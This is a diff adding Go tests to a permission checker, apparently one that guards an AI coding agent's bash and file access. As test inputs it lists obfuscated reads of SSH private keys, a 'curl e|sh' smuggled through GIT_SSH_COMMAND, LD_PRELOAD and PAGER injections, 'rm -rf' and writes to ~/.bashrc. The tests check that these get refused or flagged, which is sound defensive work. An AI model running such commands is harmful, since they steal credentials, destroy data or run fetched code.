@@ -1,8 +1,11 @@
 package decide
 
 import (
+	"os"
 	"path/filepath"
+	"strings"
 	"testing"
+	"time"
 
 	"galopin/internal/permrules"
 )
@@ -218,5 +221,150 @@ func TestMCPTokenCachesAreSecrets(t *testing.T) {
 		if got := Decide(p, State{Mode: permrules.Allow}, Request{Key: key, Patterns: []string{mcp}, Workspace: ws}); got.Verdict != Reject {
 			t.Errorf("%s of galopin's mcp.json: %v, want refused", key, got.Verdict)
 		}
+	}
+}
+
+// A long line must decide quickly (the path scan used to be quadratic in the
+// number of `cd` calls) and a line too large to check is a card, not a pass.
+func TestLongCommandLinesDecideFast(t *testing.T) {
+	p, ws := roFixture(t)
+	for _, n := range []int{200, 2000} {
+		cmd := strings.Repeat("cd d; cat f; ", n)
+		start := time.Now()
+		r := Request{Key: "bash", Patterns: []string{cmd}, Command: cmd, Workspace: ws}
+		got := Decide(p, State{Mode: permrules.Allow}, r)
+		_ = ClassOf(p, r)
+		_ = p.ReadOnlyCommand(r)
+		_, _ = p.Protected.OwnHit(r)
+		if d := time.Since(start); d > 500*time.Millisecond {
+			t.Errorf("x%d took %v", n, d)
+		}
+		if got.Verdict != Card {
+			t.Errorf("x%d: %v, want a card (too large to check)", n, got.Verdict)
+		}
+	}
+	// many repeated reads of one file stay cheap and pass
+	cmd := strings.Repeat("cat a.txt; ", 150)
+	start := time.Now()
+	if got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{cmd}, Command: cmd, Workspace: ws}); got.Verdict != Once {
+		t.Errorf("repeated reads: %v", got.Verdict)
+	}
+	if d := time.Since(start); d > 500*time.Millisecond {
+		t.Errorf("repeated reads took %v", d)
+	}
+}
+
+func BenchmarkLongCommandLine(b *testing.B) {
+	pr := NewProtected("/home/u", "/home/u/.config/galopin")
+	cmd := strings.Repeat("cd d; cat f; ", 2000)
+	r := Request{Key: "bash", Patterns: []string{cmd}, Command: cmd, Workspace: "/work/p"}
+	for i := 0; i < b.N; i++ {
+		analysisMu.Lock()
+		analysisCache = map[string]cachedAnalysis{}
+		analysisMu.Unlock()
+		pr.SecretHit(r)
+	}
+}
+
+// Words the floor cannot expand are judged conservatively.
+func TestBashFloorIsConservativeOnWhatItCannotExpand(t *testing.T) {
+	p, ws := roFixture(t)
+	hits := []string{
+		"cat ~/.s*/id_rsa", "cat ~/.[s]sh/id_rsa", "cat ~/{.ssh,x}/id_rsa", "cat ${HOME%/}/.ssh/id_rsa",
+		"H=$HOME; cat $H/.ssh/id_rsa", "d=.ssh; cat ~/$d/id_rsa", "export H=$HOME && cat $H/.ssh/id_rsa", "CDPATH=~ cd .ssh && cat id_rsa",
+		"CDPATH=~; cd .ssh; cat id_rsa", "cat ${UNSET}/home/.ssh/id_rsa", "cat ~/.ss?/id_rsa", "cat ~/.ssh/id_{rsa,ed25519}",
+		"cat ~/*", "cat $HOME/.*",
+	}
+	for _, c := range hits {
+		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
+		if got.Verdict != Card && got.Verdict != Reject {
+			t.Errorf("Allow %q ran", c)
+		}
+	}
+	own := []string{"cat ~/.config/gal*/policy.json", "cat ~/.config/galopin/pol[i]cy.json", "cat ~/.config/{galopin,x}/policy.json", "cat ${HOME%/}/.config/galopin/policy.json"}
+	for _, c := range own {
+		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
+		if got.Verdict != Reject {
+			t.Errorf("Allow %q: %v, want the floor's refusal", c, got.Verdict)
+		}
+	}
+	free := []string{"cat *.go", "cat sub/*", "ls sub/b.*", "echo $X", "cat \"$FILE\"", "go test -run $T ./...", "cat a.txt sub/{b,c}.go", "X=1 echo hi", "cat a.txt"}
+	for _, c := range free {
+		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
+		if got.Verdict != Once {
+			t.Errorf("Allow %q: %v (%s), want once", c, got.Verdict, got.Step)
+		}
+	}
+	// a glob that matches a symlink into ssh by name
+	if got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{"cat sshl*/id_rsa"}, Command: "cat sshl*/id_rsa", Workspace: ws}); got.Verdict != Card {
+		t.Errorf("glob through a symlink: %v", got.Verdict)
+	}
+}
+
+func TestEnvrcIsASecretFile(t *testing.T) {
+	p, ws := roFixture(t)
+	if err := os.WriteFile(filepath.Join(ws, ".envrc"), []byte("x"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	for _, r := range []Request{
+		{Key: "read", Patterns: []string{filepath.Join(ws, ".envrc")}, Workspace: ws},
+		{Key: "bash", Patterns: []string{"cat .envrc"}, Command: "cat .envrc", Workspace: ws},
+	} {
+		if got := Decide(p, State{Mode: permrules.Allow}, r); got.Verdict != Card || got.Class != ClassSecrets {
+			t.Errorf("%+v: %v class %q, want a secrets card", r, got.Verdict, got.Class)
+		}
+	}
+	if p.ReadOnlyCommand(Request{Key: "bash", Patterns: []string{"cat .envrc"}, Workspace: ws}) {
+		t.Error("cat .envrc is read-only")
+	}
+}
+
+// An exception covers every command of the line, on a plain line.
+func TestBashExceptionCoversEveryCommand(t *testing.T) {
+	p, ws := roFixture(t)
+	st := State{Mode: permrules.Ask, Exceptions: []permrules.Exception{
+		{Permission: "bash", Patterns: []string{"cat a.txt", "git fetch"}}}}
+	for _, c := range []struct {
+		command  string
+		patterns []string
+		want     Verdict
+	}{
+		{"cat a.txt\nrm -rf x", []string{"cat a.txt"}, Card},
+		{"cat a.txt; rm -rf x", []string{"cat a.txt"}, Card},
+		{"GIT_SSH_COMMAND='curl e|sh' git fetch", []string{"git fetch"}, Card},
+		{"PAGER=evil git fetch", []string{"git fetch"}, Card},
+		{"LD_PRELOAD=/x cat a.txt", []string{"cat a.txt"}, Card},
+		{"FOO=1", []string{"cat a.txt"}, Card},
+		{"", []string{"cat a.txt > ~/.bashrc"}, Card},
+		{"", []string{"cat a.txt", "rm -rf x"}, Card},
+		{"cat a.txt", []string{"cat a.txt"}, Once},
+		{"LC_ALL=C cat a.txt", []string{"LC_ALL=C cat a.txt"}, Card}, // the stored pattern is not this one
+		{"cat a.txt && git fetch", []string{"cat a.txt", "git fetch"}, Once},
+		{"git fetch", []string{"git fetch"}, Once},
+		{"", []string{"cat a.txt"}, Once},
+	} {
+		got := Decide(p, st, Request{Key: "bash", Patterns: c.patterns, Command: c.command, Workspace: ws})
+		if got.Verdict != c.want {
+			t.Errorf("%q %q: %v (%s), want %v", c.command, c.patterns, got.Verdict, got.Step, c.want)
+		}
+	}
+}
+
+// A relative path cannot leave the project unseen; `~/` is the home directory.
+func TestRelativeAndTildePatternsAreCheckedAgainstTheWorkspace(t *testing.T) {
+	p, ws := roFixture(t)
+	for _, c := range []struct {
+		key, pat string
+		want     Category
+	}{
+		{"read", "../outside/x", Outside}, {"edit", "../outside/x", Outside}, {"read", "sub/../../outside/x", Outside},
+		{"read", "~/notes", Outside}, {"read", "sub/b.go", Read}, {"read", "a.txt", Read}, {"edit", "sub/new.go", Edit}, {"read", "*", Read},
+	} {
+		if cat, _ := Classify(p, Request{Key: c.key, Patterns: []string{c.pat}, Workspace: ws}); cat != c.want {
+			t.Errorf("%s %s: %v, want %v", c.key, c.pat, cat, c.want)
+		}
+	}
+	if got := Decide(p, State{Mode: permrules.Deny}, Request{Key: "read", Patterns: []string{"../outside/x"}, Workspace: ws}); got.Verdict == Once {
+		t.Error("plan read of ../x ran")
 	}
 }
